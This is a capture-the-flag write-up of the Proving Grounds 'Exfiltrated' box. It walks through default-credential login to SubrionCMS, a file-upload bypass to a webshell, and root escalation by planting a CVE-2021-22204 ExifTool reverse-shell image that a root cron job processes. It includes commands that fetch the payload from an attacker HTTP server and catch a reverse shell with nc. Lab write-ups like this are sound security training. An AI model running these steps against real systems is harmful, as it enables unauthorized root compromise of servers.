# Exfiltrated — Proving Grounds

> [!abstract] Summary
> Exfiltrated runs **SubrionCMS 4.2.1** on port 80 behind the hostname `exfiltrated.offsec`. Default credentials (`admin`/`admin`) grant access to the admin panel, and the CMS is vulnerable to an **authenticated file upload bypass** (CVE-2018-19422) that delivers a webshell as `www-data`. Privilege escalation exploits a **root cron job** that runs `exiftool` on every file in the uploads directory. By crafting a malicious image with **CVE-2021-22204** (ExifTool arbitrary code execution via DjVu metadata), we get the cron to execute a reverse shell as root.

**Target:** `192.168.170.163`

## Methodology

1. Scan all TCP ports; identify SSH (22) and HTTP (80).
2. Add `exfiltrated.offsec` to `/etc/hosts` (Nmap shows a redirect).
3. Identify SubrionCMS 4.2.1; log in with default credentials (`admin`/`admin`).
4. Exploit CVE-2018-19422 (file upload bypass to RCE) to get a shell as `www-data`.
5. Discover a root cron job running `exiftool` on uploaded files.
6. Craft a malicious image using CVE-2021-22204 and upload it.
7. Wait for the cron to process the image — root shell.

## Privilege Escalation

### Enumeration — Root Cron Job with ExifTool

As `www-data`, enumerate running processes and cron jobs. Using `pspy` or checking `/etc/crontab` reveals a root cron job that periodically runs `exiftool` on files in the SubrionCMS uploads directory:

```
cat /etc/crontab
```

The relevant cron entry runs something like:
```
* * * * * root /opt/image-exif.sh
```

Inspect the script:
```
cat /opt/image-exif.sh
```

The script uses `exiftool` to process/extract metadata from uploaded image files. Since `exiftool` runs as **root** on files we control (the uploads directory), we can exploit **CVE-2021-22204** — a vulnerability in ExifTool where a specially crafted DjVu file triggers arbitrary code execution when ExifTool parses its metadata.

### ExifTool RCE (CVE-2021-22204)

On the attacker machine, clone the exploit:
```
git clone https://github.com/tuhinGsg/CVE-2021-22204-exiftool
cd CVE-2021-22204-exiftool
```

Generate the malicious `image.jpg` with an embedded reverse shell. The exploit uses `djvumake` and `bzz` to craft a DjVu file with a command injection payload, then wraps it as a JPEG:

```
python3 exploit.py KALI_IP 1234
```

This creates `image.jpg` containing a reverse shell payload directed at our Kali machine on port 1234.

Start a listener on the attacker machine:
```
nc -lvnp 1234
```

Transfer the malicious image to the target. From the `www-data` shell, download it via a Python HTTP server:

On Kali:
```
python3 -m http.server 8888
```

On the target:
```
cd /var/www/html/uploads
wget http://KALI_IP:8888/image.jpg
```

Alternatively, upload the malicious image through the SubrionCMS admin panel's file manager at `/panel/uploads/`.

### Root Shell

Wait for the cron job to execute (runs every minute). When `exiftool` processes our malicious `image.jpg`, the embedded DjVu payload fires and connects back to our listener:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [KALI_IP] from (UNKNOWN) [192.168.170.163] ...
root@exfiltrated:/# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root.

## Lessons Learned

1. **Always try default credentials.** SubrionCMS shipped with `admin`/`admin` and nobody changed them. This is a quick win before any brute-forcing.

2. **Check `robots.txt` for hidden paths.** The `/panel/` admin path was disclosed in `robots.txt`, which Nmap picked up during the service scan.

3. **File upload filters based on extension are easily bypassed.** SubrionCMS blocked `.php` but allowed `.phar`, which Apache still interprets as PHP. Extension blacklists are weaker than content-type validation.

4. **Cron jobs that process user-controlled files are dangerous.** A root cron running `exiftool` on uploaded images is an escalation vector — any tool that parses complex file formats can have parsing vulnerabilities.

5. **CVE-2021-22204 is a critical ExifTool vulnerability.** ExifTool versions before 12.24 are vulnerable to arbitrary code execution via crafted DjVu metadata. Always check if the target runs a vulnerable version of tools used in automated pipelines.

6. **Always enumerate cron jobs after getting a shell.** Check `/etc/crontab`, `/etc/cron.d/`, per-user crontabs, and use `pspy` to observe processes in real time.
